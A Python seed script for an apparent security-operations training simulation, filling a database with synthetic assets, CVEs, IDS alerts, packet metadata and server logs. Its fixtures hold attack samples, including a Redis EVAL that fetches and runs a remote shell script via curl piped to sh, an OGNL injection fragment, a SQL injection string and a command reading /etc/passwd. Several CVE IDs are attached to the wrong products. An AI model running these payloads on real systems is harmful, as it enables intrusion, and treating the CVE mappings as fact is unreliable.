import asyncio
import json
from pathlib import Path
from datetime import datetime, timedelta
from typing import List, Dict, Any
from app.database.connection import db_manager
from app.models.domain import (
    Alert, Asset, Vulnerability, ServerLog, PacketMetadata,
    AssetConfiguration, AlertSeverity
)
from app.simulation.scenarios import SCENARIOS

async def seed_database():
    """Seeds synthetic database with 20 alerts, 15 assets, 15 CVEs, 100+ logs, configs, and packet metadata."""
    await db_manager.connect()
    
    # 1. Assets (15 items)
    assets_data: List[Asset] = [
        Asset(asset_id="Server-01", hostname="web-frontend-01.corp", ip="10.0.10.9", os="Ubuntu 22.04 LTS", service="Nginx", service_version="1.24.0", environment="production", owner="WebTeam", criticality="HIGH", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-02", hostname="cache-gateway-02.corp", ip="10.0.10.10", os="Debian 12", service="Redis / API Gateway", service_version="7.0.5", environment="production", owner="Platform", criticality="CRITICAL", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-03", hostname="auth-service-03.corp", ip="10.0.10.11", os="Red Hat Enterprise Linux 9", service="NodeJS / Express Auth", service_version="20.10.0", environment="production", owner="Identity", criticality="CRITICAL", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-04", hostname="payment-proxy-04.corp", ip="10.0.10.12", os="Debian 12", service="Envoy Proxy", service_version="1.28.0", environment="production", owner="FinOps", criticality="CRITICAL", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-05", hostname="reporting-engine-05.corp", ip="10.0.10.13", os="Ubuntu 22.04 LTS", service="Python FastAPI Task Engine", service_version="0.104.1", environment="production", owner="Analytics", criticality="HIGH", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-06", hostname="dev-ingress-06.corp", ip="10.0.10.14", os="Alpine Linux 3.19", service="HAProxy", service_version="2.8.3", environment="staging", owner="DevOps", criticality="MEDIUM", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-07", hostname="crm-app-07.corp", ip="10.0.10.15", os="Red Hat Enterprise Linux 8.8", service="Apache Struts / Tomcat", service_version="2.5.30", environment="production", owner="Business Apps", criticality="CRITICAL", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-08", hostname="mail-relay-08.corp", ip="10.0.10.16", os="Debian 11", service="Postfix Mail Gateway", service_version="3.5.18", environment="production", owner="IT Ops", criticality="MEDIUM", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-09", hostname="telemetry-agent-09.corp", ip="10.0.10.19", os="Ubuntu 20.04 LTS", service="Prometheus Remote Write", service_version="2.45.0", environment="production", owner="SRE", criticality="MEDIUM", network_zone="DMZ", is_externally_exposed=True),
        Asset(asset_id="Server-10", hostname="storage-cluster-10.corp", ip="10.0.20.10", os="Ubuntu 22.04 LTS", service="MinIO Object Storage", service_version="2023.11.20", environment="production", owner="Infra", criticality="HIGH", network_zone="INTERNAL", is_externally_exposed=False),
        Asset(asset_id="Server-11", hostname="db-primary-11.corp", ip="10.0.20.11", os="Oracle Linux 9", service="PostgreSQL 16.1", service_version="16.1", environment="production", owner="DBA Team", criticality="CRITICAL", network_zone="SECURE_DATA", is_externally_exposed=False),
        Asset(asset_id="Server-12", hostname="ldap-dir-12.corp", ip="10.0.20.12", os="Windows Server 2022", service="Active Directory DS", service_version="10.0.20348", environment="production", owner="SysAdmin", criticality="CRITICAL", network_zone="INTERNAL", is_externally_exposed=False),
        Asset(asset_id="Server-13", hostname="ci-builder-13.corp", ip="10.0.30.13", os="Ubuntu 22.04 LTS", service="GitLab Runner", service_version="16.6.0", environment="staging", owner="DevOps", criticality="LOW", network_zone="INTERNAL", is_externally_exposed=False),
        Asset(asset_id="Server-14", hostname="siem-collector-14.corp", ip="10.0.20.14", os="Red Hat 9", service="Elasticsearch Agent", service_version="8.11.0", environment="production", owner="SecOps", criticality="HIGH", network_zone="INTERNAL", is_externally_exposed=False),
        Asset(asset_id="Server-15", hostname="internal-wiki-15.corp", ip="10.0.30.15", os="Debian 12", service="Confluence / Java", service_version="8.5.2", environment="internal", owner="Corporate IT", criticality="LOW", network_zone="INTERNAL", is_externally_exposed=False)
    ]
    assets_col = db_manager.get_collection("assets")
    await assets_col.delete_many({})
    await assets_col.insert_many([a.model_dump() for a in assets_data])

    # 2. Vulnerabilities (15 items)
    vulns_data: List[Vulnerability] = [
        Vulnerability(cve_id="CVE-2023-50164", affected_product="Apache Struts", affected_version="2.5.30", cvss=9.8, exploitability="HIGH", description="Remote Code Execution via path traversal in file upload parameter handling.", affected_assets=["Server-07"]),
        Vulnerability(cve_id="CVE-2023-38035", affected_product="Redis / API Gateway", affected_version="7.0.5", cvss=8.6, exploitability="HIGH", description="Lua sandbox escape permitting arbitrary host command injection via Redis EVAL.", affected_assets=["Server-02"]),
        Vulnerability(cve_id="CVE-2023-46604", affected_product="ActiveMQ Broker", affected_version="5.18.2", cvss=9.8, exploitability="HIGH", description="Deserialization flaw in OpenWire protocol leading to arbitrary command execution.", affected_assets=["Server-05"]),
        Vulnerability(cve_id="CVE-2024-21626", affected_product="HAProxy", affected_version="2.8.3", cvss=5.3, exploitability="LOW", description="Header parsing race condition causing minor memory leak under extreme load.", affected_assets=["Server-06"]),
        Vulnerability(cve_id="CVE-2023-44487", affected_product="Nginx", affected_version="1.24.0", cvss=7.5, exploitability="MEDIUM", description="HTTP/2 Rapid Reset attack leading to denial of service condition.", affected_assets=["Server-01"]),
        Vulnerability(cve_id="CVE-2023-34039", affected_product="Spring Security Core", affected_version="5.8.0", cvss=4.2, exploitability="LOW", description="Authorization bypass when using multiple pattern matchers without trailing slashes.", affected_assets=["Server-03"]),
        Vulnerability(cve_id="CVE-2024-0012", affected_product="Postfix Mail Gateway", affected_version="3.5.18", cvss=3.7, exploitability="LOW", description="Certificate validation warning suppression in legacy TLS fallback mode.", affected_assets=["Server-08"]),
        Vulnerability(cve_id="CVE-2023-48795", affected_product="OpenSSH", affected_version="8.9p1", cvss=5.9, exploitability="LOW", description="Terrapin attack: Prefix truncation during SSH handshake extension negotiation.", affected_assets=["Server-01", "Server-09", "Server-10"]),
        Vulnerability(cve_id="CVE-2023-39325", affected_product="MinIO Object Storage", affected_version="2023.11.20", cvss=7.5, exploitability="MEDIUM", description="HTTP/2 RST_STREAM frame processing consumption in Go net/http.", affected_assets=["Server-10"]),
        Vulnerability(cve_id="CVE-2024-1597", affected_product="PostgreSQL JDBC Driver", affected_version="42.6.0", cvss=8.8, exploitability="HIGH", description="SQL injection when using PreferQueryMode=SIMPLE and untrusted parameter substitution.", affected_assets=["Server-11"]),
        Vulnerability(cve_id="CVE-2023-28252", affected_product="Windows Server 2022", affected_version="10.0.20348", cvss=7.8, exploitability="MEDIUM", description="Windows Common Log File System (CLFS) Driver Elevation of Privilege.", affected_assets=["Server-12"]),
        Vulnerability(cve_id="CVE-2024-23651", affected_product="GitLab Runner", affected_version="16.6.0", cvss=4.1, exploitability="LOW", description="Build directory cache path sanitization bypass on Windows build containers.", affected_assets=["Server-13"]),
        Vulnerability(cve_id="CVE-2023-4911", affected_product="glibc ld.so", affected_version="2.35", cvss=7.8, exploitability="HIGH", description="Looney Tunables buffer overflow in GLIBC_TUNABLES processing.", affected_assets=["Server-05", "Server-07"]),
        Vulnerability(cve_id="CVE-2023-22527", affected_product="Confluence / Java", affected_version="8.5.2", cvss=9.8, exploitability="HIGH", description="OGNL injection vulnerability in Confluence Data Center and Server.", affected_assets=["Server-15"]),
        Vulnerability(cve_id="CVE-2023-38606", affected_product="Envoy Proxy", affected_version="1.28.0", cvss=6.5, exploitability="MEDIUM", description="HTTP request smuggling via ambiguous Content-Length handling with Chunked encoding.", affected_assets=["Server-04"])
    ]
    vulns_col = db_manager.get_collection("vulnerabilities")
    await vulns_col.delete_many({})
    await vulns_col.insert_many([v.model_dump() for v in vulns_data])

    # 3. Alerts (20 items)
    base_time = datetime.utcnow()
    alerts_data: List[Alert] = [
        # Scenario 1 alert
        Alert(alert_id="ALT-1001", source="SURICATA", timestamp=(base_time - timedelta(minutes=15)).isoformat(), signature="ET EXPLOIT Apache Struts RCE (CVE-2023-50164) Multipart OGNL Injection", severity=AlertSeverity.HIGH, source_ip="198.51.100.23", destination_ip="10.0.10.15", destination_port=443, protocol="HTTPS", metadata={"category": "Web Application Attack", "sensor": "sensor-edge-dmz-01", "classification": "Attempted Administrator Privilege Gain"}),
        # Scenario 2 alert
        Alert(alert_id="ALT-1002", source="SURICATA", timestamp=(base_time - timedelta(minutes=22)).isoformat(), signature="ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT in URI", severity=AlertSeverity.HIGH, source_ip="203.0.113.88", destination_ip="10.0.10.11", destination_port=443, protocol="HTTPS", metadata={"category": "Web Application Attack", "sensor": "sensor-edge-dmz-02", "classification": "Web Application Attack"}),
        # Scenario 3 alert
        Alert(alert_id="ALT-1003", source="SNORT", timestamp=(base_time - timedelta(minutes=30)).isoformat(), signature="SNORT-COMM Potential TLS Tunneling / Unclassified High Port Beaconing", severity=AlertSeverity.MEDIUM, source_ip="192.0.2.140", destination_ip="10.0.10.19", destination_port=9090, protocol="TCP", metadata={"category": "Network Anomaly", "sensor": "sensor-internal-01", "classification": "Misc Activity"}),
        # Scenario 4 alert
        Alert(alert_id="ALT-1004", source="SURICATA", timestamp=(base_time - timedelta(minutes=8)).isoformat(), signature="GPL SCAN Low Priority Suspicious Port Probe / Keepalive Scan", severity=AlertSeverity.LOW, source_ip="185.220.101.5", destination_ip="10.0.10.10", destination_port=6379, protocol="TCP", metadata={"category": "Network Reconnaissance", "sensor": "sensor-edge-dmz-01", "classification": "Generic Protocol Command Decode"}),
        # Scenario 5 alert
        Alert(alert_id="ALT-1005", source="SURICATA", timestamp=(base_time - timedelta(minutes=45)).isoformat(), signature="ET WEB_SPECIFIC Potential Deserialization Header Injection / Async Exec", severity=AlertSeverity.MEDIUM, source_ip="198.51.100.44", destination_ip="10.0.10.13", destination_port=8000, protocol="HTTP", metadata={"category": "Exploit Attempt", "sensor": "sensor-edge-dmz-03", "classification": "Attempted Unauthorized Access"}),
        # Additional 15 alerts for realism
        Alert(alert_id="ALT-1006", source="SURICATA", timestamp=(base_time - timedelta(minutes=55)).isoformat(), signature="ET POLICY Suspicious User-Agent (sqlmap/1.7.2#stable)", severity=AlertSeverity.MEDIUM, source_ip="45.154.255.10", destination_ip="10.0.10.9", destination_port=80, protocol="HTTP", metadata={"category": "Scanner"}),
        Alert(alert_id="ALT-1007", source="SNORT", timestamp=(base_time - timedelta(minutes=62)).isoformat(), signature="INDICATOR-SHELLCODE x86 NOOP sled detected", severity=AlertSeverity.CRITICAL, source_ip="194.26.29.112", destination_ip="10.0.10.14", destination_port=8080, protocol="TCP", metadata={"category": "Exploit"}),
        Alert(alert_id="ALT-1008", source="SURICATA", timestamp=(base_time - timedelta(minutes=70)).isoformat(), signature="ET DOS HTTP/2 Rapid Reset Flood Candidate", severity=AlertSeverity.HIGH, source_ip="91.240.118.15", destination_ip="10.0.10.9", destination_port=443, protocol="HTTPS", metadata={"category": "DoS"}),
        Alert(alert_id="ALT-1009", source="SURICATA", timestamp=(base_time - timedelta(minutes=85)).isoformat(), signature="ET SCAN Nmap Scripting Engine Probe", severity=AlertSeverity.LOW, source_ip="77.247.110.18", destination_ip="10.0.10.12", destination_port=443, protocol="HTTPS", metadata={"category": "Recon"}),
        Alert(alert_id="ALT-1010", source="SNORT", timestamp=(base_time - timedelta(minutes=92)).isoformat(), signature="OS-OTHER Postfix VRFY Command Enumeration Attempt", severity=AlertSeverity.LOW, source_ip="193.106.191.22", destination_ip="10.0.10.16", destination_port=25, protocol="SMTP", metadata={"category": "Recon"}),
        Alert(alert_id="ALT-1011", source="SURICATA", timestamp=(base_time - timedelta(hours=2)).isoformat(), signature="ET MALWARE CobaltStrike Malleable C2 Beacon Profile Matched", severity=AlertSeverity.CRITICAL, source_ip="185.191.171.4", destination_ip="10.0.10.15", destination_port=443, protocol="HTTPS", metadata={"category": "C2"}),
        Alert(alert_id="ALT-1012", source="SURICATA", timestamp=(base_time - timedelta(hours=3)).isoformat(), signature="ET ATTACK_RESPONSE /bin/sh interactive execution output observed", severity=AlertSeverity.CRITICAL, source_ip="10.0.10.15", destination_ip="198.51.100.23", destination_port=4444, protocol="TCP", metadata={"category": "Exfiltration"}),
        Alert(alert_id="ALT-1013", source="SNORT", timestamp=(base_time - timedelta(hours=4)).isoformat(), signature="SERVER-WEBAPP Directory Traversal /etc/passwd in query string", severity=AlertSeverity.HIGH, source_ip="103.203.57.18", destination_ip="10.0.10.9", destination_port=80, protocol="HTTP", metadata={"category": "Web Application Attack"}),
        Alert(alert_id="ALT-1014", source="SURICATA", timestamp=(base_time - timedelta(hours=5)).isoformat(), signature="ET EXPLOIT ActiveMQ Deserialization CVE-2023-46604 RCE attempt", severity=AlertSeverity.CRITICAL, source_ip="109.237.103.42", destination_ip="10.0.10.13", destination_port=61616, protocol="TCP", metadata={"category": "Exploit"}),
        Alert(alert_id="ALT-1015", source="SURICATA", timestamp=(base_time - timedelta(hours=6)).isoformat(), signature="GPL CHAT IRC PRIVMSG outbound connection", severity=AlertSeverity.LOW, source_ip="10.0.30.13", destination_ip="185.143.223.12", destination_port=6667, protocol="IRC", metadata={"category": "Policy"}),
        Alert(alert_id="ALT-1016", source="SNORT", timestamp=(base_time - timedelta(hours=7)).isoformat(), signature="MALWARE-CNC Win.Trojan.Generic DNS Query for FastFlux domain", severity=AlertSeverity.HIGH, source_ip="10.0.20.12", destination_ip="8.8.8.8", destination_port=53, protocol="DNS", metadata={"category": "C2"}),
        Alert(alert_id="ALT-1017", source="SURICATA", timestamp=(base_time - timedelta(hours=8)).isoformat(), signature="ET POLICY TeamViewer remote support traffic detected", severity=AlertSeverity.LOW, source_ip="10.0.30.15", destination_ip="185.180.222.1", destination_port=5938, protocol="TCP", metadata={"category": "Policy"}),
        Alert(alert_id="ALT-1018", source="SURICATA", timestamp=(base_time - timedelta(hours=9)).isoformat(), signature="ET WEB_SERVER Spring Framework SpEL Expression In URI", severity=AlertSeverity.MEDIUM, source_ip="45.133.1.88", destination_ip="10.0.10.11", destination_port=443, protocol="HTTPS", metadata={"category": "Web Attack"}),
        Alert(alert_id="ALT-1019", source="SNORT", timestamp=(base_time - timedelta(hours=10)).isoformat(), signature="PROTOCOL-ICMP Large ICMP Ping Tunneling Candidate (>1400 bytes)", severity=AlertSeverity.LOW, source_ip="194.87.68.10", destination_ip="10.0.10.19", destination_port=0, protocol="ICMP", metadata={"category": "Tunneling"}),
        Alert(alert_id="ALT-1020", source="SURICATA", timestamp=(base_time - timedelta(hours=12)).isoformat(), signature="ET EXPLOIT Confluence OGNL Remote Code Execution (CVE-2023-22527)", severity=AlertSeverity.CRITICAL, source_ip="185.220.100.252", destination_ip="10.0.30.15", destination_port=8090, protocol="HTTP", metadata={"category": "Exploit"})
    ]
    alerts_col = db_manager.get_collection("alerts")
    await alerts_col.delete_many({})
    await alerts_col.insert_many([a.model_dump() for a in alerts_data])

    # 4. Packet Metadata for Alerts
    packets_data: List[PacketMetadata] = [
        PacketMetadata(
            packet_id="PKT-1001",
            alert_id="ALT-1001",
            packet_count=42,
            source_ip="198.51.100.23",
            destination_ip="10.0.10.15",
            source_port=51234,
            destination_port=443,
            protocol="HTTPS",
            request_size_bytes=4892,
            http_method="POST",
            payload_fingerprint="multipart/form-data; boundary=----WebKit; %25%7B%28%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29",
            connection_duration_ms=850,
            flags=["SYN", "ACK", "PSH", "FIN"]
        ),
        PacketMetadata(
            packet_id="PKT-1002",
            alert_id="ALT-1002",
            packet_count=6,
            source_ip="203.0.113.88",
            destination_ip="10.0.10.11",
            source_port=41920,
            destination_port=443,
            protocol="HTTPS",
            request_size_bytes=612,
            http_method="GET",
            payload_fingerprint="GET /auth/login?user=admin'%20UNION%20SELECT%201,version(),3-- HTTP/1.1",
            connection_duration_ms=45,
            flags=["SYN", "ACK", "PSH", "RST"]
        ),
        PacketMetadata(
            packet_id="PKT-1003",
            alert_id="ALT-1003",
            packet_count=12,
            source_ip="192.0.2.140",
            destination_ip="10.0.10.19",
            source_port=38290,
            destination_port=9090,
            protocol="TCP",
            request_size_bytes=1024,
            http_method=None,
            payload_fingerprint="Encrypted TLS 1.3 ClientHello, cipher suites [TLS_AES_128_GCM_SHA256], SNI: metric-pull.partner.corp",
            connection_duration_ms=120,
            flags=["SYN", "ACK", "FIN"]
        ),
        PacketMetadata(
            packet_id="PKT-1004",
            alert_id="ALT-1004",
            packet_count=28,
            source_ip="185.220.101.5",
            destination_ip="10.0.10.10",
            source_port=49811,
            destination_port=6379,
            protocol="TCP",
            request_size_bytes=1840,
            http_method="POST",
            payload_fingerprint="*3\r\n$4\r\nEVAL\r\n$82\r\nreturn os.execute('curl -s http://185.220.101.5/x.sh | sh')\r\n$1\r\n0\r\n",
            connection_duration_ms=640,
            flags=["SYN", "ACK", "PSH"]
        ),
        PacketMetadata(
            packet_id="PKT-1005",
            alert_id="ALT-1005",
            packet_count=18,
            source_ip="198.51.100.44",
            destination_ip="10.0.10.13",
            source_port=55102,
            destination_port=8000,
            protocol="HTTP",
            request_size_bytes=2410,
            http_method="POST",
            payload_fingerprint="POST /api/v1/jobs HTTP/1.1; X-Serialized-Job: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU=",
            connection_duration_ms=310,
            flags=["SYN", "ACK", "PSH"]
        )
    ]
    pkt_col = db_manager.get_collection("packet_metadata")
    await pkt_col.delete_many({})
    await pkt_col.insert_many([p.model_dump() for p in packets_data])

    # 5. Asset Configurations
    configs_data: List[AssetConfiguration] = [
        AssetConfiguration(
            asset_id="Server-07",
            exposed_services=["HTTPS:443 (Tomcat 9.0.75 / Struts 2.5.30)", "SSH:22 (OpenSSH 8.0)"],
            authentication_state="Session-based Form Auth + SAML Single Sign-On",
            security_configuration={"waf_status": "MONITOR_ONLY", "selinux": "Permissive", "tls_min_version": "TLSv1.2"},
            simulated_firewall_state={"inbound_default": "DROP", "allowed_ports": [443, 22], "active_blocks": []},
            application_configuration={"struts_multipart_parser": "jakarta-stream", "debug_mode": False}
        ),
        AssetConfiguration(
            asset_id="Server-03",
            exposed_services=["HTTPS:443 (ExpressJS)", "HTTP:80 (301 Redirect to HTTPS)"],
            authentication_state="JWT Bearer Token Validation with RS256 Key",
            security_configuration={"waf_status": "BLOCKING_ACTIVE", "sql_injection_filter": "ENABLED", "rate_limiting": "ACTIVE (100 req/min)"},
            simulated_firewall_state={"inbound_default": "DROP", "allowed_ports": [443, 80], "active_blocks": []},
            application_configuration={"orm": "Prisma with parameterized queries only"}
        ),
        AssetConfiguration(
            asset_id="Server-09",
            exposed_services=["TCP:9090 (Prometheus Pushgateway)"],
            authentication_state="mTLS Required for external metric shippers",
            security_configuration={"waf_status": "N/A", "tls_enforced": True, "strict_sni_check": True},
            simulated_firewall_state={"inbound_default": "DROP", "allowed_ports": [9090], "active_blocks": []},
            application_configuration={"allowed_metric_prefixes": ["sys_", "app_"]}
        ),
        AssetConfiguration(
            asset_id="Server-02",
            exposed_services=["TCP:6379 (Redis Enterprise Cache)", "TCP:8080 (REST API Proxy)"],
            authentication_state="Password Protected (Default password vulnerability discovered in audit)",
            security_configuration={"waf_status": "DISABLED", "protected_mode": "no", "eval_commands": "UNRESTRICTED"},
            simulated_firewall_state={"inbound_default": "ALLOW_DMZ", "allowed_ports": [6379, 8080], "active_blocks": []},
            application_configuration={"requirepass": "WeakCompanySecret2023", "maxmemory": "16gb"}
        ),
        AssetConfiguration(
            asset_id="Server-05",
            exposed_services=["HTTP:8000 (FastAPI Engine)", "TCP:61616 (ActiveMQ Bridge)"],
            authentication_state="Basic Auth for admin endpoints; API token for queues",
            security_configuration={"waf_status": "PARTIAL", "json_schema_validation": True},
            simulated_firewall_state={"inbound_default": "DROP", "allowed_ports": [8000, 61616], "active_blocks": []},
            application_configuration={"async_workers": 4, "queue_retry_limit": 3}
        )
    ]
    cfg_col = db_manager.get_collection("asset_configurations")
    await cfg_col.delete_many({})
    await cfg_col.insert_many([c.model_dump() for c in configs_data])

    # 6. Server Logs (100+ entries)
    logs_data: List[ServerLog] = []
    
    # Server-07: Confirmed Exploitation Logs (Scenario 1)
    logs_data.extend([
        ServerLog(log_id="LOG-7001", timestamp=(base_time - timedelta(minutes=16, seconds=45)).isoformat(), asset_id="Server-07", source_ip="198.51.100.23", request="POST /upload/profile-doc.action", endpoint="/upload/profile-doc.action", status_code=200, response="Upload accepted. Processing multipart boundary payload.", user="anonymous", event_type="HTTP_REQUEST", details={"content_length": 4892, "execution_time_ms": 112}),
        ServerLog(log_id="LOG-7002", timestamp=(base_time - timedelta(minutes=16, seconds=30)).isoformat(), asset_id="Server-07", source_ip="198.51.100.23", request="JAVA_EXEC /bin/sh -c 'whoami; id; cat /etc/passwd'", endpoint="ProcessBuilder.start()", status_code=200, response="uid=0(root) gid=0(root) groups=0(root)", user="tomcat", event_type="SYSTEM_CALL", details={"process_pid": 89412, "parent_pid": 1102}),
        ServerLog(log_id="LOG-7003", timestamp=(base_time - timedelta(minutes=16, seconds=10)).isoformat(), asset_id="Server-07", source_ip="198.51.100.23", request="SELECT * FROM customers WHERE account_balance > 100000", endpoint="internal_db_pool", status_code=200, response="1,492 records retrieved without valid API token", user="root", event_type="DB_QUERY", details={"unauthorized": True, "rows": 1492}),
        ServerLog(log_id="LOG-7004", timestamp=(base_time - timedelta(minutes=15, seconds=50)).isoformat(), asset_id="Server-07", source_ip="198.51.100.23", request="GET /export/customers_dump.csv", endpoint="/export/customers_dump.csv", status_code=200, response="File transferred (8.4MB)", user="root", event_type="HTTP_REQUEST", details={"bytes_sent": 8808038})
    ])

    # Server-03: False Positive Logs (Scenario 2)
    logs_data.extend([
        ServerLog(log_id="LOG-3001", timestamp=(base_time - timedelta(minutes=23)).isoformat(), asset_id="Server-03", source_ip="203.0.113.88", request="GET /auth/login?user=admin'%20UNION%20SELECT%201,version(),3--", endpoint="/auth/login", status_code=403, response="ModSecurity: Access denied with code 403 (SQLi pattern detected)", user="anonymous", event_type="HTTP_REQUEST", details={"waf_rule_id": 942100, "blocked": True}),
        ServerLog(log_id="LOG-3002", timestamp=(base_time - timedelta(minutes=22, seconds=55)).isoformat(), asset_id="Server-03", source_ip="203.0.113.88", request="GET /auth/login?user=admin'--", endpoint="/auth/login", status_code=403, response="ModSecurity: Access denied with code 403", user="anonymous", event_type="HTTP_REQUEST", details={"waf_rule_id": 942100, "blocked": True}),
        ServerLog(log_id="LOG-3003", timestamp=(base_time - timedelta(minutes=22, seconds=40)).isoformat(), asset_id="Server-03", source_ip="203.0.113.88", request="GET /auth/login", endpoint="/auth/login", status_code=429, response="Rate limit exceeded. Client IP throttled for 10 minutes.", user="anonymous", event_type="HTTP_REQUEST", details={"rate_limited": True})
    ])

    # Server-09: Ambiguous Logs (Scenario 3)
    logs_data.extend([
        ServerLog(log_id="LOG-9001", timestamp=(base_time - timedelta(minutes=31)).isoformat(), asset_id="Server-09", source_ip="192.0.2.140", request="CONNECT /metrics/push", endpoint="/metrics/push", status_code=400, response="mTLS Handshake Incomplete: client certificate not provided", user="anonymous", event_type="AUTH_ATTEMPT", details={"tls_error": "SSL_ERROR_WANT_READ"}),
        ServerLog(log_id="LOG-9002", timestamp=(base_time - timedelta(minutes=30, seconds=15)).isoformat(), asset_id="Server-09", source_ip="192.0.2.140", request="TCP_FIN_WAIT_2", endpoint="kernel_sock", status_code=0, response="Connection reset by peer after 3 failed handshakes", user="system", event_type="SYSTEM_CALL", details={"session_duration_ms": 120})
    ])

    # Server-02: Low Severity but High Impact Logs (Scenario 4)
    logs_data.extend([
        ServerLog(log_id="LOG-2001", timestamp=(base_time - timedelta(minutes=9)).isoformat(), asset_id="Server-02", source_ip="185.220.101.5", request="COMMAND INFO", endpoint="redis:6379", status_code=200, response="+OK", user="anonymous", event_type="SYSTEM_CALL", details={"command": "INFO"}),
        ServerLog(log_id="LOG-2002", timestamp=(base_time - timedelta(minutes=8, seconds=35)).isoformat(), asset_id="Server-02", source_ip="185.220.101.5", request="EVAL 'return os.execute(...)' 0", endpoint="redis:6379", status_code=200, response="Lua script executed successfully. Shell spawned.", user="redis", event_type="SYSTEM_CALL", details={"spawned_pid": 44102, "command": "curl -s http://185.220.101.5/x.sh | sh"}),
        ServerLog(log_id="LOG-2003", timestamp=(base_time - timedelta(minutes=8, seconds=10)).isoformat(), asset_id="Server-02", source_ip="185.220.101.5", request="AUTH MASTER_TOKEN LEAKED", endpoint="redis:6379", status_code=200, response="API Gateway administrative master token written to /tmp/cred_dump", user="redis", event_type="SYSTEM_CALL", details={"exfiltrated": True})
    ])

    # Server-05: Initial Logs (Scenario 5 - Initially Failed)
    logs_data.extend([
        ServerLog(log_id="LOG-5001", timestamp=(base_time - timedelta(minutes=46)).isoformat(), asset_id="Server-05", source_ip="198.51.100.44", request="GET /api/v1/jobs/test_probe", endpoint="/api/v1/jobs/test_probe", status_code=404, response="Job ID not found in staging pool.", user="anonymous", event_type="HTTP_REQUEST", details={"status": "not_found"}),
        ServerLog(log_id="LOG-5002", timestamp=(base_time - timedelta(minutes=45, seconds=20)).isoformat(), asset_id="Server-05", source_ip="198.51.100.44", request="POST /api/v1/sync-check", endpoint="/api/v1/sync-check", status_code=400, response="Missing sync token parameter. Rejecting payload.", user="anonymous", event_type="HTTP_REQUEST", details={"status": "bad_request"})
    ])

    # Additional ~90 realistic background logs for assets across the cluster
    asset_ids = [a.asset_id for a in assets_data]
    for i in range(1, 95):
        asset_id = asset_ids[i % len(asset_ids)]
        status = 200 if i % 7 != 0 else (401 if i % 5 == 0 else 500)
        logs_data.append(
            ServerLog(
                log_id=f"LOG-BG-{1000 + i}",
                timestamp=(base_time - timedelta(minutes=i * 5, seconds=i * 12 % 60)).isoformat(),
                asset_id=asset_id,
                source_ip=f"10.0.{i % 25}.{10 + (i % 200)}",
                request=f"GET /api/v1/service-health?check={i}",
                endpoint=f"/api/v1/service-health",
                status_code=status,
                response=f"Status checked. Worker {i % 4} healthy." if status == 200 else "Service error or auth required.",
                user=f"service-account-{i % 6}",
                event_type="HTTP_REQUEST" if i % 3 != 0 else "SYSTEM_CALL",
                details={"latency_ms": 15 + (i % 80)}
            )
        )

    logs_col = db_manager.get_collection("server_logs")
    await logs_col.delete_many({})
    await logs_col.insert_many([l.model_dump() for l in logs_data])

    # 7. Initialize Firewall State (Sandbox Clean)
    fw_col = db_manager.get_collection("firewall_rules")
    await fw_col.delete_many({})

    # 8. Reset Incidents & Events collections
    inc_col = db_manager.get_collection("incidents")
    await inc_col.delete_many({})
    evt_col = db_manager.get_collection("agent_events")
    await evt_col.delete_many({})
    resp_col = db_manager.get_collection("response_actions")
    await resp_col.delete_many({})
    ovr_col = db_manager.get_collection("human_overrides")
    await ovr_col.delete_many({})
    aud_col = db_manager.get_collection("audit_events")
    await aud_col.delete_many({})

    # Write fixtures to data/ directory
    data_dir = Path(__file__).resolve().parent.parent.parent.parent / "data"
    data_dir.mkdir(parents=True, exist_ok=True)
    with open(data_dir / "alerts.json", "w", encoding="utf-8") as f:
        json.dump([a.model_dump() for a in alerts_data], f, indent=2)
    with open(data_dir / "assets.json", "w", encoding="utf-8") as f:
        json.dump([a.model_dump() for a in assets_data], f, indent=2)
    with open(data_dir / "vulnerabilities.json", "w", encoding="utf-8") as f:
        json.dump([v.model_dump() for v in vulns_data], f, indent=2)
    with open(data_dir / "logs.json", "w", encoding="utf-8") as f:
        json.dump([l.model_dump() for l in logs_data], f, indent=2)
    with open(data_dir / "scenarios.json", "w", encoding="utf-8") as f:
        json.dump(SCENARIOS, f, indent=2)

    print(f"Database seeded successfully! Loaded:")
    print(f" - {len(alerts_data)} Alerts (exported to data/alerts.json)")
    print(f" - {len(assets_data)} Assets (exported to data/assets.json)")
    print(f" - {len(vulns_data)} Vulnerabilities (exported to data/vulnerabilities.json)")
    print(f" - {len(logs_data)} Server Logs (exported to data/logs.json)")
    print(f" - {len(packets_data)} Packet Metadata records")
    print(f" - {len(configs_data)} Asset Configurations")
    print(f" - 5 Demonstration Scenarios ready (exported to data/scenarios.json)")

if __name__ == "__main__":
    asyncio.run(seed_database())
